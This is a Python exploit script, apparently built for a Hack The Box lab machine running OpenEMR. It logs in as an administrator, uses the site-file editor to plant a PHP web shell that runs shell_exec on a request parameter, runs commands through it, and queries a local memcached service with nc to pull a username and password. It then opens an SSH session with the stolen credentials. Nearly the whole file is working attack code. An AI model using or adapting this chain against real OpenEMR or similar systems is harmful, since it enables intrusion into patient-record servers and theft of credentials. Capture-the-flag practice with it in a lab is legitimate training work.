import os
import sys
import requests


def login(url):
    s = requests.Session()
    url = url + '/interface/main/main_screen.php'
    params = {'auth': 'login', 'site': 'default'}
    headers = {
        'Referer': 'http://hms.htb/interface/login/login.php?site=default',
        'Content-Type': 'application/x-www-form-urlencoded'

    }
    data = {
        'new_login_session_management': '1', 'authProvider': 'Default', 'languageChoice': '1',
        'authUser': 'openemr_admin', 'clearPass': 'xxxxxx'
    }
    try:
        login = s.post(url, params=params, data=data, headers=headers)
    except:
        print("[!] Check the Connection, Login Failed")
        sys.exit(1)
    print("[*] Login Successfully")
    return s


def update(s, url):
    url = url + '/interface/super/manage_site_files.php'
    data = {
        'form_filename': 'letter_templates/custom_pdf.php',
        'MAX_FILE_SIZE': 12000000,
        'bn_save': 'Save',
        'form_dest_filename': ""
    }
    files = [
        ('form_image', ("", None, "application/octet-stream")),
        ("form_filedata", (None,
                           "<?php if(!empty($_REQUEST['cmd'])){ echo shell_exec($_REQUEST['cmd']); } else { echo 'please fill cmd request'; } ?>")),
        ("form_education", (None, None, "application/octet-stream"))
    ]
    # s.proxies = {"http":"http://127.0.0.1:8080"}
    try:
        exploit = s.post(url, data=data, files=files)

    except:
        print("[!] Couldn't Upload the Payload, Try Again")
        sys.exit(1)
    print("[*] Payload Uploaded Successfully.")


def get_cmd(url, s, getcredscmd):
    url = url + "/sites/default/letter_templates/custom_pdf.php"
    data = {'cmd': 'id'}
    try:
        id = s.post(url, data=data)
    except:
        print("[!] Couldn't find the payload to exploit service, Try Again!")
        sys.exit(1)

    print(f"[+] Got: {id.text.strip()}")
    data = {'cmd': getcredscmd}

    try:
        execute = s.post(url, data=data)
    except:
        print("[!] Couldn't Get the Creds of User ,try again")
    creds = execute.text.split("\r\n")
    username = creds[1]
    password = creds[4]
    print(f"[+] Got User Creds For Escalation:  {username} = {password}")
    return username, password


def main():
    url = "http://hms.htb"
    remote_ip = "10.10.10.188"
    hostname = "10.10.10.188"

    getcredscmd = """
    nc 127.0.0.1 11211 <<EOF
    get user 
    get passwd
    quit
    quit
    EOF
    """

    s = login(url)

    update(s, url)
    username, password = get_cmd(url, s, getcredscmd)

    os.system("ssh  {}@{}".format(username, hostname))


if __name__ == "__main__":
    main()


